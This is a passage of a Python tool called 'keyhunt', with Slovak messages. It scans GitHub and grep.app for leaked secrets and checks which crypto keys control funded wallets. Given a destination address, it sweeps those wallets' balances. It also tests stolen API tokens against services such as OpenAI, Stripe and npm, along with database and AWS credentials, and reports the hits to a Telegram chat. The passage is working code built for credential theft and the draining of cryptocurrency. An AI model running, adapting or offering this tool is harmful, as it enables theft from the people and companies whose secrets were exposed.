                       method="POST", body={"query": "{ viewer { name } }"})
    return ok, "ok" if ok else ""

async def v_npm(s, k):
    ok, r = await _get(s, "https://registry.npmjs.org/-/whoami", {"Authorization": f"Bearer {k}"})
    if ok and r != "limit":
        try:
            return True, (await r.json()).get("username", "ok")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_infura(s, k):
    ok, r = await _get(s, f"https://mainnet.infura.io/v3/{k}", method="POST",
                       body={"jsonrpc": "2.0", "id": 1, "method": "eth_blockNumber", "params": []})
    if ok and r != "limit":
        try:
            return (True, "ok") if "result" in await r.json() else (False, "")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_alchemy(s, k):
    ok, r = await _get(s, f"https://eth-mainnet.g.alchemy.com/v2/{k}", method="POST",
                       body={"jsonrpc": "2.0", "id": 1, "method": "eth_blockNumber", "params": []})
    if ok and r != "limit":
        try:
            return (True, "ok") if "result" in await r.json() else (False, "")
        except Exception:
            return True, "ok"
    return ok, ""

async def v_sentry(s, dsn):
    u = urlparse(dsn)
    proj = (u.path or "/1").strip("/")
    url = f"{u.scheme}://{u.hostname}/api/{proj}/store/"
    h = {"X-Sentry-Auth": f"Sentry sentry_version=7, sentry_key={u.username}, "
                          f"sentry_client=keyhunt/1.0", "Content-Type": "application/json"}
    ok, _ = await _get(s, url, h, method="POST",
                       body={"message": "keyhunt ping", "level": "info", "platform": "python"})
    return ok, "event prijatý" if ok else ""

async def v_mapbox(s, k):
    ok, _ = await _get(s, f"https://api.mapbox.com/tokens/v2?access_token={k}")
    return ok, "ok" if ok else ""


VALIDATORS = {
    "openai": v_openai, "anthropic": v_anthropic, "openrouter": v_openrouter,
    "groq": v_groq, "perplexity": v_perplexity, "replicate": v_replicate,
    "huggingface": v_hf, "github": v_github, "gitlab": v_gitlab, "google": v_google,
    "stripe": v_stripe, "sendgrid": v_sendgrid, "mailgun": v_mailgun,
    "slack": v_slack, "slack_webhook": v_slack_wh, "discord_wh": v_discord_wh,
    "telegram_bot": v_telegram, "digitalocean": v_digitalocean, "netlify": v_netlify,
    "notion": v_notion, "linear": v_linear, "npm": v_npm, "infura": v_infura,
    "alchemy": v_alchemy, "sentry": v_sentry, "mapbox": v_mapbox,
}


# ------------------------------------------------------------------ zdroje
async def gh_search(session, queries, pages, max_files):
    h = {"Accept": "application/vnd.github+json"}
    if GH_TOKEN:
        h["Authorization"] = f"Bearer {GH_TOKEN}"
    seen, out = set(), []
    for q in queries:
        if len(out) >= max_files:
            break
        for page in range(1, pages + 1):
            try:
                async with session.get("https://api.github.com/search/code",
                                       params={"q": q, "per_page": 100, "page": page},
                                       headers=h, timeout=aiohttp.ClientTimeout(total=30)) as r:
                    if r.status == 403:
                        await asyncio.sleep(20); continue
                    if r.status != 200:
                        break
                    data = await r.json()
            except Exception:
                break
            items = data.get("items", [])
            if not items:
                break
            for it in items:
                k = (it["repository"]["full_name"], it["path"])
                if k not in seen:
                    seen.add(k); out.append(k)
            await asyncio.sleep(2)
    print(f"  [github] {len(out)} súborov")
    return out


async def grepapp_search(session, queries):
    out, seen = [], set()
    for q in queries[:14]:
        try:
            async with session.get("https://grep.app/api/search",
                                   params={"q": q.strip('"')},
                                   timeout=aiohttp.ClientTimeout(total=25)) as r:
                if r.status != 200:
                    continue
                d = await r.json()
        except Exception:
            continue
        for h in (d.get("hits", {}) or {}).get("hits", [])[:30]:
            try:
                key = (h["repo"]["raw"], h["path"]["raw"])
                if key in seen:
                    continue
                seen.add(key)
                snip = re.sub(r"<[^>]+>", "", h.get("content", {}).get("snippet", ""))
                out.append((key, snip.replace("&quot;", '"').replace("&amp;", "&")))
            except Exception:
                continue
        await asyncio.sleep(1)
    print(f"  [grep.app] {len(out)} zásahov")
    return out


async def fetch_raw(session, repo, path):
    try:
        async with session.get(f"https://raw.githubusercontent.com/{repo}/HEAD/{path}",
                               timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status == 200:
                return (await r.text())[:200_000]
    except Exception:
        pass
    return ""


# ------------------------------------------------------------------ main
async def run(args):
    if not GH_TOKEN:
        print("[!] Bez GITHUB_TOKEN je GitHub search obmedzený.")
    only = set(args.only.split(",")) if args.only else None

    async with aiohttp.ClientSession() as session:
        print("[*] hľadám po celom svete...")
        files = await gh_search(session, args.queries, args.pages, args.max_files)

        sem = asyncio.Semaphore(20)
        async def grab(rp):
            async with sem:
                return rp, await fetch_raw(session, *rp)
        fetched = list(await asyncio.gather(*[grab(rp) for rp in files]))
        fetched += await grepapp_search(session, args.queries)
        print(f"[*] spracúvam {len(fetched)} zdrojov...")

        targets, others = [], {}
        for (repo, path), text in fetched:
            if not text:
                continue
            if not only or "crypto" in only:
                for kind, val in find_secrets(text):
                    targets += derive_targets(kind, val, repo, path, args.max_index,
                                              set(args.chains.split(",")))
            for val, info in find_other_secrets(text).items():
                if only and info["cat"] not in only:
                    continue
                others.setdefault(val, {**info, "repo": repo, "path": path})

        by_addr = {}
        for t in targets:
            by_addr.setdefault(t.addr, t)
        targets = list(by_addr.values())
        print(f"[*] adries: {len(targets)} | ostatných: {len(others)}")

        cache = Cache(args.db)
        ch = Checker(session, cache)
        groups = {}
        for t in targets:
            groups.setdefault(t.chain, []).append(t)
        for chain, ts in groups.items():
            print(f"    {chain}: {len(ts)}")
            if chain == "solana":
                await ch.sol_native(ts)
                await ch.sol_tokens(ts)
            elif chain.startswith("evm:"):
                await ch.evm(chain.split(":", 1)[1], ts)
            elif chain in ESPLORA:
                await ch.esplora(chain, ts)
            elif chain == "tron":
                await ch.tron(ts)

        if args.verify and ch.hits:
            print("[*] overujem aktivitu...")
            vs = asyncio.Semaphore(8)
            async def vf(a, h):
                async with vs:
                    d = await last_activity(session, a, h["chain"])
                h["idle_days"] = d
                h["abandoned"] = d is None or d > 365
            await asyncio.gather(*[vf(a, h) for a, h in ch.hits.items()])

        # ---- sweep ----
        swept = {}
        if args.sweep:
            print(f"[*] sweep -> {args.sweep}")
            for a, h in list(ch.hits.items()):
                if ":" in a or h["chain"] == "solana-token":
                    continue
                if cache.was_swept(a):
                    continue
                pk = privkey_for(h)
                if not pk:
                    continue
                try:
                    if h["chain"] == "solana" and pk[0] == "sol":
                        lam = int(h["balance"] * 1e9) - SOL_FEE
                        if lam < args.min_sweep * 1e9:
                            continue
                        tx = await sweep_sol(session, Keypair.from_seed(pk[1]),
                                             args.sweep, lam)
                    elif h["chain"].startswith("evm:") and pk[0] == "evm":
                        tx = await sweep_evm(session, pk[1], args.sweep,
                                             h["chain"].split(":", 1)[1])
                    else:
                        continue
                    if tx and not str(tx).startswith("ERR"):
                        swept[a] = tx
                        cache.mark_swept(a, str(tx))
                        print(f"    SWEPT {a} -> {tx}")
                except Exception as e:
                    print(f"    sweep zlyhal {a}: {e}")

        # ---- ostatné tajomstvá ----
        results = {"db": {}, "aws": {}, "api": {}, "detected": {}}
        print("[*] overujem prístupy...")
        asem = asyncio.Semaphore(12)
        async def probe(val, info):
            name, cat = info["name"], info["cat"]
            async with asem:
                if cat == "db":
                    r = await check_db(val)
                elif name == "aws_pair":
                    if ":" not in val:
                        r = None
                    else:
                        ak, sk = val.split(":", 1)
                        try:
                            r = await _to_thread(_aws, ak, sk)
                        except Exception as e:
                            r = f"ERR {type(e).__name__}"
                elif name in VALIDATORS:
                    ok, note = await VALIDATORS[name](session, val)
                    r = (f"OK {note}".strip() if ok else None)
                else:
                    r = None
            if r and r.startswith("OK"):
                results[cat if cat in results else "api"][val] = {**info, "detail": r}
            elif cat == "db" and r:
                results["detected"][val] = {**info, "detail": r}
            elif cat == "other":
                results["detected"][val] = {**info, "detail": ""}
        await asyncio.gather(*[probe(v, i) for v, i in others.items()])

    # ---------------- report ----------------
    prices = {}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("https://api.coingecko.com/api/v3/simple/price",
                             params={"ids": "solana,ethereum,bitcoin,litecoin,tron",
                                     "vs_currencies": "usd"}) as r:
                prices = await r.json()
    except Exception:
        pass
    px = {"solana": prices.get("solana", {}).get("usd", 0),
          "evm:eth": prices.get("ethereum", {}).get("usd", 0),
          "btc": prices.get("bitcoin", {}).get("usd", 0),
          "ltc": prices.get("litecoin", {}).get("usd", 0),
          "tron": prices.get("tron", {}).get("usd", 0)}

    out = {"crypto": ch.hits, "swept": swept, **results}
    print("\n" + "=" * 78)
    print("### KRYPTO")
    for a, h in sorted(ch.hits.items(),
                       key=lambda x: -(x[1]["balance"] * px.get(x[1]["chain"], 0))):
        usd = h["balance"] * px.get(h["chain"], 0)
        print(f"{'NOVÉ ' if h.get('is_new') else '     '}{h['balance']:>16.8f} "
              f"{h['chain']:<10} {('~'+format(usd,'.2f')+' USD') if usd else '':<12} "
              f"{a}{'  OPUSTENÉ' if h.get('abandoned') else ''}")
        print(f"        {h['repo']}/{h['path']} [{h['kind']}] idx={h['index']} {h['note']}")
    if not ch.hits:
        print("  nič")

    for key, label in (("db", "### DATABÁZY — PRÍSTUP FUNGUJE"),
                       ("aws", "### AWS — PRÍSTUP FUNGUJE"),
                       ("api", "### API KĽÚČE — FUNGUJÚ")):
        print("\n" + label)
        if not results[key]:
            print("  nič")
        for v, i in results[key].items():
            print(f"  {i['name']:<14} {v[:70]}")
            print(f"        {i['detail'][:80]}")
            print(f"        {i['repo']}/{i['path']}")

    if results["detected"]:
        print("\n### DETEKOVANÉ / ZLYHANÉ (skús z vlastnej IP)")
        for v, i in list(results["detected"].items())[:50]:
            print(f"  {i['name']:<12} {str(v)[:60]}  {i.get('detail','')[:40]}")
            print(f"        {i['repo']}/{i['path']}")

    json.dump(out, open(args.out, "w"), indent=2, default=str)
    print("=" * 78)
    print(f"[*] adries: {ch.checked} | crypto: {len(ch.hits)} | db: {len(results['db'])} "
          f"| api: {len(results['api'])} | swept: {len(swept)} | {args.out}")

    if TG_TOKEN and TG_CHAT:
        lines = [f"{h['balance']:.6f} {h['chain']} {a}" for a, h in ch.hits.items()
                 if h.get("is_new")]
        lines += [f"DB: {v[:60]}" for v in results["db"]]
        lines += [f"API: {i['name']} {v[:20]}..." for v, i in results["api"].items()]
        lines += [f"SWEPT: {a}" for a in swept]
        if lines:
            try:
                async with aiohttp.ClientSession() as s:
                    await s.get(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                                params={"chat_id": TG_CHAT,
                                        "text": "keyhunt:\n" + "\n".join(lines[:25])})
            except Exception:
                pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pages", type=int, default=3)
    ap.add_argument("--max-index", type=int, default=5)
    ap.add_argument("--max-files", type=int, default=4000)
    ap.add_argument("--chains", default="sol,evm,btc,tron,ltc")
    ap.add_argument("--queries", nargs="*", default=QUERIES)
    ap.add_argument("--db", default=DB_PATH)
    ap.add_argument("--out", default="keyhunt_hits.json")
    ap.add_argument("--verify", action="store_true")
    ap.add_argument("--sweep", default="")
    ap.add_argument("--min-sweep", type=float, default=0.0)
    ap.add_argument("--only", default="")
    ap.add_argument("--no-api", action="store_false", dest="api")
    args = ap.parse_args()
    asyncio.run(run(args))


if __name__ == "__main__":
    main()
